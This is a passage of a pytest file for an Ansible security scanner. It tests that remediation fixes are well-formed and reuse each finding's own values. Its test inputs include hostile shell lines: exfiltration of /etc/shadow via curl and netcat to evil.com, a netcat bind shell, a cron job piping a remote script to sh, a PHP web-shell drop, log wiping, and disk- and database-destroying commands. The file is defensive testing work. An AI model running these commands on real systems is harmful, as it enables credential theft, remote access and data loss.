        examples = [ex for (rid, _cat, ex) in ALL_POSITIVE_EXAMPLES if rid == rule_id]
        snippet = examples[0] if examples else "shell: echo placeholder"

    out = remediation_generator.generate_remediation_example(
        rule_id,
        snippet,
        file_path="inventory/group_vars/all.yml",
        line_number=1,
        description_fallback="structural rule description",
        recommendation_fallback="structural rule recommendation",
    )

    match = _SECURE_FIX_BLOCK_RE.search(out)
    assert match, (
        f"{rule_id}: no `\u2705 Secure Fix` block; the fix dispatch fell through "
        f"to a prose-only stub. Every known rule must ship an actionable fix.\n"
        f"  snippet: {snippet[:120]!r}\n"
        f"  remediation excerpt (first 320 chars): {out[:320]!r}"
    )
    body = match.group("body")
    assert not _TRUNCATED_JINJA_RE.search(body), (
        f"{rule_id}: Secure Fix contains a truncated Jinja expression (dangling `{{{{`)."
        f"\n  body: {body[:320]!r}"
    )
    assert not _NESTED_JINJA_RE.search(body), (
        f"{rule_id}: Secure Fix contains nested Jinja.\n  body: {body[:320]!r}"
    )
    ph = _GENERIC_PLACEHOLDER_RE.search(body)
    assert not ph, (
        f"{rule_id}: Secure Fix punts to a fill-it-in placeholder ({ph.group(0)!r}) "
        f"instead of reusing the flagged code.\n  body: {body[:320]!r}"
    )
    assert remediation_generator._is_relevant(rule_id, snippet, out), (
        f"{rule_id}: rendered fix is not relevant to the rule (wrong generator / "
        f"stale category routing).\n  remediation excerpt: {out[:320]!r}"
    )

    # Dynamism: the fix must reuse this finding's input rather than emit a
    # canned example. Two tiers, matching the two kinds of finding:
    #   1. Value-bearing findings name a concrete artifact (path/host/URL/var/
    #      key); the fix must echo that exact artifact back.
    #   2. Behaviour/command findings (``systemctl stop auditd``, ``arpspoof``)
    #      carry no structured value, so the fix must reference a distinctive
    #      token from the input instead.
    artifact = _finding_artifact(snippet)
    if artifact:
        assert _fix_is_grounded(out, artifact), (
            f"{rule_id}: the fix never references the finding's own artifact "
            f"{artifact!r}, so it reads as a static/generic example instead of a "
            f"dynamic fix for the flagged input.\n"
            f"  snippet: {snippet[:120]!r}\n"
            f"  remediation excerpt (first 400 chars): {out[:400]!r}"
        )
    else:
        tokens = _distinctive_snippet_tokens(snippet)
        if tokens:
            lowered = out.lower()
            assert any(t in lowered for t in tokens), (
                f"{rule_id}: the fix references none of the distinctive tokens "
                f"from the flagged command/behaviour ({sorted(tokens)[:6]}), so it "
                f"reads as a generic example rather than a fix for this finding.\n"
                f"  snippet: {snippet[:120]!r}\n"
                f"  remediation excerpt (first 400 chars): {out[:400]!r}"
            )


_ADVERSARIAL_DECOY_URL = "http://decoy.invalid/v1/register"


@pytest.mark.parametrize("rule_id", KNOWN_RULE_IDS, ids=KNOWN_RULE_IDS)
def test_every_rule_grounds_on_flagged_line_not_task_window(
    remediation_generator: RemediationGenerator,
    rule_id: str,
) -> None:
    """Universal multi-line safety: the scanner feeds a whole task window as
    display context while the flagged line drives the fix. A URL, path, or key
    on a *sibling* line of that window must never be mistaken for this finding's
    artifact, and no decoy line may leak into the generated fix.

    This is the assertion that catches the systemic 'written for a single line,
    fed a multi-line task' bug class across every category at once, rather than
    one rule at a time. It mirrors the real scanner call shape: the flagged line
    is ``code_snippet``; the window (with adversarial decoys) is
    ``display_snippet``.
    """
    if rule_id in _SCAN_META_RULES:
        pytest.skip("scan-meta rule: reports on the scan, carries no Ansible Secure Fix")

    snippet = _STRUCTURAL_SNIPPETS.get(rule_id)
    if snippet is None:
        examples = [ex for (rid, _cat, ex) in ALL_POSITIVE_EXAMPLES if rid == rule_id]
        snippet = examples[0] if examples else "shell: echo placeholder"

    flagged_line = snippet.splitlines()[-1].strip() if snippet.splitlines() else snippet
    indented = "\n".join("      " + ln if ln.strip() else ln for ln in snippet.splitlines())
    window = (
        "- name: Provision and register external destination\n"
        "  shell: export TMP=/x && ./run.sh mode=0600\n"
        "  vars:\n"
        f'    endpoint_url: "{_ADVERSARIAL_DECOY_URL}"\n'
        f"{indented}"
    )

    out = remediation_generator.generate_remediation_example(
        rule_id,
        flagged_line,
        file_path="inventory/group_vars/all.yml",
        line_number=5,
        display_snippet=window,
        description_fallback="structural rule description",
        recommendation_fallback="structural rule recommendation",
    )

    match = _SECURE_FIX_BLOCK_RE.search(out)
    assert match, (
        f"{rule_id}: no Secure Fix block when fed a multi-line task window.\n"
        f"  flagged line: {flagged_line[:120]!r}\n  excerpt: {out[:320]!r}"
    )
    body = match.group("body")
    assert not _TRUNCATED_JINJA_RE.search(body), f"{rule_id}: truncated Jinja.\n{body[:320]!r}"
    assert not _NESTED_JINJA_RE.search(body), f"{rule_id}: nested Jinja.\n{body[:320]!r}"

    # The decoy URL/key legitimately appears in the Vulnerable Code display
    # block (the window is shown as context). The bug is when it bleeds into the
    # Secure Fix - the grounding comment or the fix body - which means the
    # generator treated a sibling line as this finding's artifact.
    grounding_line = next(
        (ln for ln in out.splitlines() if "Applies to the flagged finding" in ln), ""
    )
    assert _ADVERSARIAL_DECOY_URL not in grounding_line, (
        f"{rule_id}: the fix grounds on the decoy sibling URL instead of the "
        f"flagged line's own artifact.\n  grounding: {grounding_line!r}"
    )
    assert _ADVERSARIAL_DECOY_URL not in body, (
        f"{rule_id}: the decoy sibling URL leaked into the Secure Fix body, so "
        f"extraction picked the wrong line of the task window.\n  body: {body[:320]!r}"
    )
    assert "endpoint_url" not in body, (
        f"{rule_id}: the decoy sibling key 'endpoint_url' leaked into the fix body, "
        f"so extraction picked the wrong line of the task window.\n  body: {body[:320]!r}"
    )


# Structural (AST / Python-defined) rules have no ``patterns/*.yml`` entry and
# therefore no ``positive_examples``, so the catalog-driven test above never
# exercises them. They are nonetheless emitted as real findings and must ship a
# dynamic Secure Fix that reuses the finding's own code. Each example below is a
# realistic task the rule fires on, paired with a token the dynamic fix must
# substitute from that code.
STRUCTURAL_RULE_EXAMPLES = [
    (
        "missing_no_log",
        '- name: authenticate\n  uri:\n    url: "https://api/x"\n    password: "{{ vault_pw }}"',
        "no_log: true",
    ),
    (
        "ignore_errors_security_task",
        "- name: verify cert\n  ansible.builtin.command: openssl verify /etc/ssl/cert.pem\n  ignore_errors: yes",
        "failed_when:",
    ),
    (
        "get_url_no_checksum",
        '- name: download tf\n  get_url:\n    url: "https://releases.example.com/{{ ver }}/tf.zip"\n    dest: "./tf.zip"',
        "checksum:",
    ),
    (
        "s3_download_no_integrity_check",
        '- name: pull iocs\n  aws_s3:\n    bucket: b\n    object: o\n    dest: "/tmp/{{ name }}.json"\n    mode: get',
        "/tmp/{{ name }}.json",
    ),
    (
        "set_fact_secret_alias",
        '- name: alias secret\n  set_fact:\n    app_token: "{{ raw_token.stdout }}"',
        "vault_app_token",
    ),
    (
        "credential_file_missing_mode",
        '- name: copy cert\n  copy:\n    src: /tmp/x.pem\n    dest: "/etc/ssl/private/x.pem"\n    owner: root',
        "mode: '0600'",
    ),
    (
        "private_key_written_outside_canonical_dir_ast",
        '- name: drop key\n  copy:\n    src: id_rsa\n    dest: "/opt/app/id_rsa"\n    owner: app',
        "mode: '0600'",
    ),
    (
        "hardcoded_credentials",
        'service_password: "REDACTED_EXAMPLE_VALUE"',
        "vault_service_password",
    ),
]


@pytest.mark.parametrize(
    "rule_id,snippet,must_contain",
    STRUCTURAL_RULE_EXAMPLES,
    ids=[r for r, _, _ in STRUCTURAL_RULE_EXAMPLES],
)
def test_structural_rule_renders_dynamic_secure_fix(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    snippet: str,
    must_contain: str,
) -> None:
    """Structural rules must ship a dynamic Secure Fix, not prose.

    These rules are defined in ``file_scanner.py`` (not pattern YAML) and the
    scanner passes ``description_fallback``/``recommendation_fallback`` for
    them, which historically short-circuited dispatch to a procedural metadata
    stub. This locks in the dynamic, code-reusing fix so that regression can't
    recur silently.
    """
    out = remediation_generator.generate_remediation_example(
        rule_id,
        snippet,
        file_path="test.yml",
        line_number=1,
        description_fallback="structural rule description",
        recommendation_fallback="structural rule recommendation",
    )
    _assert_well_formed(rule_id, out)

    match = _SECURE_FIX_BLOCK_RE.search(out)
    assert match, (
        f"{rule_id}: structural rule produced no `\u2705 Secure Fix` block - "
        f"dispatch fell through to a prose-only metadata stub.\n"
        f"  remediation excerpt: {out[:320]!r}"
    )

    body = match.group("body")
    assert not _TRUNCATED_JINJA_RE.search(body), (
        f"{rule_id}: Secure Fix contains a truncated Jinja expression "
        f"(dangling `{{{{`).\n  body: {body[:320]!r}"
    )
    assert not _NESTED_JINJA_RE.search(body), (
        f"{rule_id}: Secure Fix contains nested Jinja.\n  body: {body[:320]!r}"
    )
    ph = _GENERIC_PLACEHOLDER_RE.search(body)
    assert not ph, (
        f"{rule_id}: Secure Fix contains a fill-it-in-yourself placeholder "
        f"({ph.group(0)!r}) instead of reusing the finding's own code.\n"
        f"  body: {body[:320]!r}"
    )
    yaml.safe_load(body)  # raises if the Secure Fix isn't valid YAML
    assert must_contain in body, (
        f"{rule_id}: Secure Fix did not dynamically apply the expected hardening "
        f"({must_contain!r}) drawn from the finding's own code.\n"
        f"  body: {body[:320]!r}"
    )


# Handlers that extract a value from the finding (via `_first`/bespoke parsing)
# and weave it into the fix. Unlike the static-by-design majority, these claim
# to be dynamic, so a refactor that silently drops back to a hardcoded block
# must fail. Each row is (rule_id, snippet, token_the_fix_must_echo): the token
# is a distinctive value in the snippet that a genuinely dynamic fix reproduces.
# Only rules whose handler is designed to echo belong here.
DYNAMIC_EXTRACTION_EXAMPLES = [
    (
        "aws_ssm_send_command",
        'shell: >\n  aws ssm send-command --instance-ids "{{ target_instance_id }}" '
        '--region "{{ deploy_region }}" '
        "--parameters 'commands=[\"bash /opt/scripts/bootstrap.sh\"]'",
        "bash /opt/scripts/bootstrap.sh",
    ),
    (
        "aws_ssm_send_command",
        'shell: aws ssm send-command --instance-ids "{{ worker_instance_id }}" '
        "--parameters 'commands=[\"python3 /opt/scripts/rotate_keys.py\"]'",
        "{{ worker_instance_id }}",
    ),
    (
        "aws_ec2_run_instances",
        "shell: aws ec2 run-instances --image-id ami-0abc1234 --instance-type m5.large",
        "m5.large",
    ),
    (
        "aws_lambda_create",
        "shell: aws lambda create-function --function-name order-worker --runtime python3.12",
        "order-worker",
    ),
    (
        "aws_s3_data_access",
        "shell: aws s3 cp s3://example-artifacts-bucket/dump.tar.gz /tmp/x",
        "example-artifacts-bucket",
    ),
    (
        "aws_sts_assume_role",
        "shell: aws sts assume-role --role-arn arn:aws:iam::123456789012:role/deployer",
        "arn:aws:iam::123456789012:role/deployer",
    ),
]


@pytest.mark.parametrize(
    "rule_id,snippet,must_echo",
    DYNAMIC_EXTRACTION_EXAMPLES,
    ids=[f"{r}#{i}" for i, (r, _, _) in enumerate(DYNAMIC_EXTRACTION_EXAMPLES)],
)
def test_dynamic_handler_echoes_extracted_value(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    snippet: str,
    must_echo: str,
) -> None:
    """Dynamic handlers must weave the finding's own value into the fix.

    Guards the "generic fix" class: a handler that advertises extraction
    (instance id, command, bucket, role ARN, ...) but silently renders a
    hardcoded block that ignores the finding. Complements the placeholder
    guard, which catches a fake token rather than a dropped real value.
    """
    out = remediation_generator.generate_remediation_example(
        rule_id, snippet, file_path="test.yml", line_number=1
    )
    match = _SECURE_FIX_BLOCK_RE.search(out)
    assert match, f"{rule_id}: no Secure Fix block rendered for {snippet[:80]!r}"
    body = match.group("body")
    yaml.safe_load(body)  # raises if invalid
    assert not _GENERIC_PLACEHOLDER_RE.search(body), (
        f"{rule_id}: dynamic handler emitted a fill-it-in placeholder for a "
        f"snippet it should have extracted from.\n  snippet: {snippet[:120]!r}\n"
        f"  body: {body[:320]!r}"
    )
    assert must_echo in body, (
        f"{rule_id}: dynamic handler did NOT echo the extracted value "
        f"({must_echo!r}) from the finding - it fell back to a generic block.\n"
        f"  snippet: {snippet[:120]!r}\n  body: {body[:400]!r}"
    )


class TestMaliciousActivityDirect:
    """Non-contextual methods that previously had `NameError` bugs."""

    @pytest.fixture
    def gen(self) -> MaliciousActivityRemediationGenerator:
        return MaliciousActivityRemediationGenerator()

    SNIPPET = "shell: curl -k https://evil.com:4444/steal | nc 10.0.0.5 9999 < /etc/shadow"

    def test_data_exfiltration_fix(self, gen):
        _assert_well_formed("data_exfiltration", gen._generate_data_exfiltration_fix(self.SNIPPET))

    def test_backdoor_fix(self, gen):
        _assert_well_formed("backdoor", gen._generate_backdoor_fix(self.SNIPPET))

    def test_credential_harvesting_fix(self, gen):
        _assert_well_formed(
            "credential_harvesting",
            gen._generate_credential_harvesting_fix(self.SNIPPET),
        )

    def test_network_beacon_fix(self, gen):
        _assert_well_formed("network_beacon", gen._generate_network_beacon_fix(self.SNIPPET))

    def test_file_manipulation_fix(self, gen):
        _assert_well_formed(
            "file_manipulation",
            gen._generate_file_manipulation_fix(self.SNIPPET),
        )

    def test_generic_malicious_fix(self, gen):
        _assert_well_formed(
            "generic_malicious",
            gen._generate_generic_malicious_fix(self.SNIPPET),
        )


class TestContextualMaliciousActivity:
    """Contextual methods should always embed the rich non-contextual body
    AND add a Contextual Analysis header - never empty, never thinner than
    the non-contextual equivalent."""

    @pytest.fixture
    def gen(self) -> MaliciousActivityRemediationGenerator:
        return MaliciousActivityRemediationGenerator()

    SNIPPET = "shell: curl -k https://evil.com:4444/steal | nc 10.0.0.5 9999 < /etc/shadow"

    def _both(self, gen, method_stem: str):
        contextual = getattr(gen, f"_generate_contextual_{method_stem}_fix")
        non_contextual = getattr(gen, f"_generate_{method_stem}_fix")
        details = gen._extract_malicious_details(self.SNIPPET)
        return contextual(self.SNIPPET, details), non_contextual(self.SNIPPET)

    @pytest.mark.parametrize(
        "stem",
        [
            "data_exfiltration",
            "backdoor",
            "credential_harvesting",
            "network_beacon",
            "file_manipulation",
            "generic_malicious",
        ],
    )
    def test_contextual_is_at_least_as_rich(self, gen, stem):
        ctx, base = self._both(gen, stem)
        _assert_well_formed(f"contextual_{stem}", ctx)
        assert "Contextual Analysis" in ctx, f"contextual_{stem} missing Contextual Analysis header"
        assert len(ctx) >= len(base), (
            f"contextual_{stem} is thinner than non-contextual baseline ({len(ctx)} vs {len(base)})"
        )


class TestExtractMaliciousDetails:
    """The extractor underpins every contextual fix - exercise its branches."""

    @pytest.fixture
    def gen(self) -> MaliciousActivityRemediationGenerator:
        return MaliciousActivityRemediationGenerator()

    def test_extracts_urls_hosts_files_ports(self, gen):
        d = gen._extract_malicious_details(
            "curl -k https://evil.com:8080/steal | base64 | bash > /tmp/backdoor.sh"
        )
        assert "https://evil.com:8080/steal" in d["urls"]
        assert "evil.com" in d["domains"]
        assert "evil.com" in d["hosts"]
        assert "8080" in d["ports"]
        assert "/tmp/backdoor.sh" in d["files"]

    def test_extracts_ipv4(self, gen):
        d = gen._extract_malicious_details("nc 10.0.0.5 4444 < /etc/passwd")
        assert "10.0.0.5" in d["ips"]
        assert "10.0.0.5" in d["hosts"]
        assert "4444" in d["ports"]
        assert "/etc/passwd" in d["files"]

    def test_extracts_env_variables(self, gen):
        d = gen._extract_malicious_details("echo $AWS_SECRET_ACCESS_KEY > /tmp/c")
        assert "AWS_SECRET_ACCESS_KEY" in d["variables"]

    def test_deterministic_ordering(self, gen):
        # insertion-order dedupe must be stable
        snippet = "curl https://a.com; curl https://b.com; curl https://a.com"
        d1 = gen._extract_malicious_details(snippet)
        d2 = gen._extract_malicious_details(snippet)
        assert d1 == d2
        assert d1["hosts"] == ["a.com", "b.com"]


@pytest.mark.parametrize(
    "cls,method,rule_id,snippet",
    [
        (
            SystemCompromiseRemediationGenerator,
            "_generate_history_manipulation_fix",
            "bash_history_tampering",
            "shell: history -c && HISTFILE=/dev/null",
        ),
        (
            SystemCompromiseRemediationGenerator,
            "_generate_log_tampering_fix",
            "audit_log_tampering",
            "shell: rm -f /var/log/auth.log && auditctl -D",
        ),
        (
            SystemCompromiseRemediationGenerator,
            "_generate_backdoor_listener_fix",
            "backdoor_listener",
            "shell: nc -lvp 4444 -e /bin/bash",
        ),
        (
            SystemCompromiseRemediationGenerator,
            "_generate_web_shell_fix",
            "web_shell_drop",
            "shell: cp /bin/bash /var/www/html/shell.php",
        ),
        (
            PrivilegeEscalationRemediationGenerator,
            "_generate_cron_abuse_fix",
            "cron_privilege_abuse",
            "shell: echo '* * * * * root curl http://evil/|sh' >> /etc/crontab",
        ),
        (
            PrivilegeEscalationRemediationGenerator,
            "_generate_service_abuse_fix",
            "service_privilege_abuse",
            "shell: systemctl edit --full evil.service",
        ),
        (
            PrivilegeEscalationRemediationGenerator,
            "_generate_file_permissions_fix",
            "dangerous_world_writable",
            "file: path=/etc/shadow mode=0777",
        ),
        (
            TemplateInjectionRemediationGenerator,
            "_generate_command_substitution_fix",
            "template_command_substitution",
            "debug: msg=\"{{ lookup('pipe', 'id') }}\"",
        ),
        (
            InsecureCommunicationRemediationGenerator,
            "_generate_telnet_fix",
            "telnet_usage",
            "shell: telnet legacy.example.com 23",
        ),
        (
            InsecureCommunicationRemediationGenerator,
            "_generate_email_fix",
            "plaintext_smtp",
            "shell: /usr/sbin/sendmail -S plainsmtp.example.com:25 u@x",
        ),
    ],
)
def test_previously_dead_methods_render_cleanly(cls, method, rule_id, snippet):
    """Each of these methods previously had `NameError` bugs from single-brace
    Jinja2 inside f-strings, or was simply never reachable. They must now
    render cleanly end-to-end."""
    gen = cls()
    out = getattr(gen, method)(snippet)
    _assert_well_formed(rule_id, out)


class TestOperationalSecurityDelegation:
    @pytest.fixture
    def gen(self) -> OperationalSecurityRemediationGenerator:
        return OperationalSecurityRemediationGenerator()

    @pytest.mark.parametrize(
        "rule_id,snippet",
        [
            ("history_file_tampering", "shell: history -c"),
            ("audit_log_tampering", "shell: auditctl -D"),
            ("log_file_deletion", "shell: rm /var/log/auth.log"),
            ("journal_log_flush", "shell: journalctl --rotate --vacuum-time=1s"),
            ("utmp_wtmp_tamper", "shell: > /var/log/wtmp"),
            ("timestomping", "shell: touch -d '2000-01-01' /bin/ls"),
        ],
    )
    def test_log_tamper_rules_delegate_to_rich_templates(self, gen, rule_id, snippet):
        """The log-tamper family now delegates to the rich SystemCompromise
        templates instead of the old 4-line stub."""
        out = gen.generate_operational_security_fix(rule_id, snippet)
        _assert_well_formed(rule_id, out)
        assert len(out) >= 800, (
            f"{rule_id}: expected rich delegated template, got only {len(out)} chars"
        )


class TestRuleIdCategoryCoverage:
    """The authoritative rule_id -> category mapping lives in
    ``rule_id_categories.yml``. Every shipped pattern must have an explicit
    entry - if this test fails, the scanner is silently falling back to the
    keyword heuristic for the listed rule_ids, which usually means a new
    pattern was added without updating the YAML.
    """

    def test_every_shipped_rule_id_has_an_explicit_category(self):
        from ansible_security_scanner.patterns_manager import patterns_manager
        from ansible_security_scanner.remediations._category_map import (
            _RULE_ID_TO_CATEGORY,
        )

        pdata = patterns_manager.discover_and_load_patterns()
        shipped_ids = {p.id for v in pdata.values() for p in v}
        missing = sorted(shipped_ids - set(_RULE_ID_TO_CATEGORY.keys()))
        assert not missing, (
            f"{len(missing)} shipped rule_id(s) are missing from "
            "rule_id_categories.yml: "
            + ", ".join(missing[:10])
            + ("..." if len(missing) > 10 else "")
        )

    def test_yaml_categories_stay_in_sync_with_resolver(self):
        """Sanity: the resolver must return what the YAML says for an
        arbitrary sample - guards against a broken loader."""
        from ansible_security_scanner.remediations._category_map import (
            _RULE_ID_TO_CATEGORY,
            resolve_category,
        )

        for rid, cat in list(_RULE_ID_TO_CATEGORY.items())[:25]:
            assert resolve_category(rid) == cat, (
                f"resolver disagrees with YAML for {rid}: "
                f"resolver={resolve_category(rid)!r}, yaml={cat!r}"
            )


class TestTaintFlowRealWorldSyntax:
    """The taint-flow remediation renders a Vulnerable + Secure example per
    sink module. This locks in that each example uses ONLY argument keys
    that exist in the real Ansible module schema - catching the class of
    regression where an earlier implementation emitted a `cmd:` block under
    `ansible.builtin.uri` (`uri` has no `cmd:` argument) or a hardcoded
    `"do-something"` placeholder with no real syntax at all.
    """

    from ansible_security_scanner.remediations.taint_flow import (
        TaintFlowRemediationGenerator,
    )

    _VALID_ARGS = {
        "shell": {"shell", "chdir", "creates", "executable", "removes", "stdin"},
        "raw": {"raw", "executable"},
        "command": {"command", "argv", "chdir", "creates", "removes", "cmd", "stdin"},
        "script": {"script", "cmd", "chdir", "creates", "removes", "executable"},
        "uri": {
            "url",
            "method",
            "body",
            "body_format",
            "headers",
            "validate_certs",
            "status_code",
            "timeout",
            "return_content",
            "user",
            "password",
            "force_basic_auth",
            "ca_path",
            "client_cert",
            "client_key",
        },
        "get_url": {
            "url",
            "dest",
            "mode",
            "owner",
            "group",
            "checksum",
            "validate_certs",
            "headers",
            "timeout",
            "force",
            "backup",
            "ca_path",
        },
        "template": {"src", "dest", "mode", "owner", "group", "backup", "validate"},
        "copy": {
            "src",
            "content",
            "dest",
            "mode",
            "owner",
            "group",
            "backup",
            "validate",
            "directory_mode",
        },
    }

    _SINK_MODULE_FQN = {
        "shell": "ansible.builtin.shell",
        "raw": "ansible.builtin.raw",
        "command": "ansible.builtin.command",
        "script": "ansible.builtin.script",
        "uri": "ansible.builtin.uri",
        "get_url": "ansible.builtin.get_url",
        "template": "ansible.builtin.template",
        "copy": "ansible.builtin.copy",
    }

    _SECURE_BLOCK_RE = re.compile(
        r"\*\*[\u2705].*?Secure.*?\*\*\s*```yaml\s*\n(?P<body>.*?)```",
        re.DOTALL,
    )
    _VULN_BLOCK_RE = re.compile(
        r"\*\*[\u274c].*?Vulnerable.*?\*\*\s*```yaml\s*\n(?P<body>.*?)```",
        re.DOTALL,
    )
    _MODULE_HEADER_RE = re.compile(r"^-\s+(?:ansible\.builtin\.)?(\w+):")
    _ARG_KEY_RE = re.compile(r"^\s{4}([a-z_]+):")

    @pytest.fixture
    def gen(self):
        return self.TaintFlowRemediationGenerator()

    @pytest.mark.parametrize("sink", sorted(_VALID_ARGS.keys()))
    def test_secure_block_uses_only_real_module_args(self, gen, sink):
        fqn = self._SINK_MODULE_FQN[sink]
        out = gen.generate_taint_flow_fix(
            rule_id="cross_file_taint",
            code_snippet="{{ some_var }}",
            sink_module=fqn,
            var_name="some_var",
        )
        _assert_well_formed(f"cross_file_taint:{sink}", out)

        secure_match = self._SECURE_BLOCK_RE.search(out)
        assert secure_match, f"{sink}: no Secure block found in remediation"
        secure_body = secure_match.group("body")

        declared_sink, module_block = self._last_module_block(secure_body)
        assert declared_sink in self._VALID_ARGS, (
            f"{sink}: Secure block uses an unknown sink module `{declared_sink}`"
        )

        used_args = set(self._ARG_KEY_RE.findall(module_block))
        invalid = used_args - self._VALID_ARGS[declared_sink]
        assert not invalid, (
            f"{sink}: Secure block uses argument(s) {sorted(invalid)!r} "
            f"that are not valid for `{declared_sink}`. "
            f"Valid args: {sorted(self._VALID_ARGS[declared_sink])!r}"
        )

    @pytest.mark.parametrize("sink", sorted(_VALID_ARGS.keys()))
    def test_vulnerable_block_uses_only_real_module_args(self, gen, sink):
        fqn = self._SINK_MODULE_FQN[sink]
        out = gen.generate_taint_flow_fix(
            rule_id="cross_file_taint",
            code_snippet="{{ some_var }}",
            sink_module=fqn,
            var_name="some_var",
        )

        vuln_match = self._VULN_BLOCK_RE.search(out)
        assert vuln_match, f"{sink}: no Vulnerable block found"
        declared_sink, module_block = self._last_module_block(vuln_match.group("body"))
        assert declared_sink in self._VALID_ARGS, (
            f"{sink}: Vulnerable block uses an unknown sink module `{declared_sink}`"
        )
        used_args = set(self._ARG_KEY_RE.findall(module_block))
        invalid = used_args - self._VALID_ARGS[declared_sink]
        assert not invalid, (
            f"{sink}: Vulnerable block uses argument(s) {sorted(invalid)!r} "
            f"not valid for `{declared_sink}`"
        )

    @classmethod
    def _last_module_block(cls, yaml_body: str) -> tuple[str, str]:
        """Split ``yaml_body`` on top-level ``- `` list markers and return
        ``(sink_name, block_body)`` for the LAST list entry whose header
        names one of the sinks under test. The taint-flow remediation
        always puts the sink as the final task after ``- set_fact: ...``.
        """
        chunks = re.split(r"\n(?=-\s+)", "\n" + yaml_body.lstrip("\n"))
        for chunk in reversed(chunks):
            m = cls._MODULE_HEADER_RE.search(chunk.lstrip("\n"))
            if not m:
                continue
            name = m.group(1)
            if name in cls._VALID_ARGS:
                return name, chunk
        raise AssertionError(f"no sink module header found in:\n{yaml_body!r}")

    def test_uri_secure_block_has_no_cmd_argv_block(self, gen):
        """Regression guard for the `ansible.builtin.uri` + `cmd:`/argv bug."""
        out = gen.generate_taint_flow_fix(
            rule_id="cross_file_taint",
            code_snippet="{{ user_input }}",
            sink_module="ansible.builtin.uri",
            var_name="user_input",
        )
        assert "cmd:" not in out, (
            "uri sink must not render `cmd:` - that key does not exist on "
            "the ansible.builtin.uri module"
        )
        assert "argv:" not in out, (
            "uri sink must not render `argv:` - that key does not exist on "
            "the ansible.builtin.uri module"
        )
        assert "url:" in out, "uri sink must render a real `url:` argument"

    def test_no_placeholder_strings_survive(self, gen):
        """Regression guard for the `"do-something ..."` hardcoded placeholder
        that earlier versions emitted for every non-shell sink."""
        for sink, fqn in self._SINK_MODULE_FQN.items():
            out = gen.generate_taint_flow_fix(
                rule_id="cross_file_taint",
                code_snippet="{{ some_var }}",
                sink_module=fqn,
                var_name="some_var",
            )
            assert "do-something" not in out, (
                f"{sink}: placeholder `do-something` leaked into remediation"
            )
            assert "your_" not in out, f"{sink}: placeholder `your_*` leaked into remediation"

    def test_main_dispatcher_routes_cross_file_taint(self):
        """End-to-end: the shared RemediationGenerator must dispatch
        `cross_file_taint` findings to the TaintFlowRemediationGenerator
        (not the generic fallback), so every taint finding in the wild
        produces a module-aware remediation."""
        main = RemediationGenerator()
        out = main.generate_remediation_example(
            rule_id="cross_file_taint",
            code_snippet="{{ tainted }}",
        )
        _assert_well_formed("cross_file_taint:dispatcher", out)
        # The generic fallback hardcodes this phrase; its presence means the
        # dispatcher failed to find the taint-flow generator.
        assert "General Security Best Practices" not in out, (
            "cross_file_taint hit the generic fallback - the dispatcher "
            "entry for `cross_file_taint` is missing or broken"
        )


class TestDataDestructionDynamicFixes:
    """The data_destruction remediations must be DYNAMIC: the concrete
    target from the finding (the device wiped, the path deleted, the
    database dropped, the LVM volume removed) has to appear in the rendered
    Secure Fix, not a generic placeholder. They must also stay semantically
    honest - a deletion fix must use ``state: absent`` and must never
    propose creating a file - and every destructive op must be gated.
    """

    @pytest.fixture(scope="class")
    def gen(self) -> RemediationGenerator:
        return RemediationGenerator()

    def _render(self, gen, rule_id, snippet):
        return gen.generate_remediation_example(
            rule_id, snippet, file_path="play.yml", line_number=3
        )

    @pytest.mark.parametrize(
        "rule_id,snippet,must_contain",
        [
            ("disk_wipe_dd", "shell: dd if=/dev/zero of=/dev/sdb bs=1M", "/dev/sdb"),
            ("recursive_delete_critical", "shell: rm -rf /home/{{ user }}", "/home/{{ user }}"),
            ("database_drop_truncate", "mysql: DROP DATABASE customers;", "customers"),
            ("lvm_vg_remove", "shell: lvremove /dev/vg0/data -f", "/dev/vg0/data"),
            ("mkfs_format_device", "shell: mkfs.xfs /dev/nvme0n1", "/dev/nvme0n1"),
            ("shred_wipe_command", "command: shred -u /srv/app/secret.key", "/srv/app/secret.key"),
        ],
    )
    def test_finding_value_is_substituted_into_fix(self, gen, rule_id, snippet, must_contain):
        out = self._render(gen, rule_id, snippet)
        _assert_well_formed(rule_id, out)
        secure = _SECURE_FIX_BLOCK_RE.search(out)
        assert secure, f"{rule_id}: no Secure Fix block"
        assert must_contain in secure.group("body"), (
            f"{rule_id}: the finding's real target {must_contain!r} was not "
            f"woven into the Secure Fix - the remediation is not dynamic.\n"
            f"  Secure Fix body (first 320 chars):\n    {secure.group('body')[:320]!r}"
        )

    @pytest.mark.parametrize(
        "rule_id,snippet",
        [
            ("recursive_delete_critical", "shell: rm -rf /etc/"),
            ("shred_wipe_command", "command: shred /srv/x"),
            ("backup_deletion", "shell: rm -f /backups/db.bak"),
        ],
    )
    def test_deletion_fix_uses_absent_not_creation(self, gen, rule_id, snippet):
        """A fix for a deletion rule must remove via ``state: absent`` and
        must never propose creating the thing it is meant to delete - the
        old file-manipulation handler suggested ``state: file`` here."""
        out = self._render(gen, rule_id, snippet)
        match = _SECURE_FIX_BLOCK_RE.search(out)
        assert match, f"{rule_id}: no Secure Fix block"
        secure = match.group("body")
        assert "state: absent" in secure, f"{rule_id}: deletion fix does not use `state: absent`"
        assert "state: file" not in secure and "state: touch" not in secure, (
            f"{rule_id}: deletion fix proposes CREATING a file - semantically wrong"
        )

    @pytest.mark.parametrize(
        "rule_id,snippet",
        [
            ("disk_wipe_dd", "shell: dd if=/dev/zero of=/dev/sdb"),
            ("database_drop_truncate", "mysql: DROP TABLE orders;"),
            ("lvm_vg_remove", "shell: vgremove vg0"),
            ("shred_wipe_command", "command: shred /srv/x"),
            ("backup_deletion", "shell: rm -rf /backups"),
            ("recursive_delete_critical", "shell: rm -rf /var/{{ d }}"),
        ],
    )
    def test_destructive_fix_is_gated(self, gen, rule_id, snippet):
        """Every destructive op must sit behind an explicit confirmation
        gate (an assert + a confirm variable), never run unconditionally."""
        out = self._render(gen, rule_id, snippet)
        match = _SECURE_FIX_BLOCK_RE.search(out)
        assert match, f"{rule_id}: no Secure Fix block"
        secure = match.group("body")
        assert "ansible.builtin.assert" in secure or "confirm" in secure, (
            f"{rule_id}: destructive fix is not gated behind a confirmation"
        )

    def test_data_destruction_routes_to_dynamic_generator(self, gen):
        """All eight data_destruction rules must resolve through the
        dynamic generator, never the metadata fallback or a stale companion
        snippet (which would emit a static placeholder, not the finding)."""
        for rule_id in (
            "disk_wipe_dd",
            "shred_wipe_command",
            "ransomware_file_encryption",
            "database_drop_truncate",
            "recursive_delete_critical",
            "mkfs_format_device",
            "backup_deletion",
            "lvm_vg_remove",
        ):
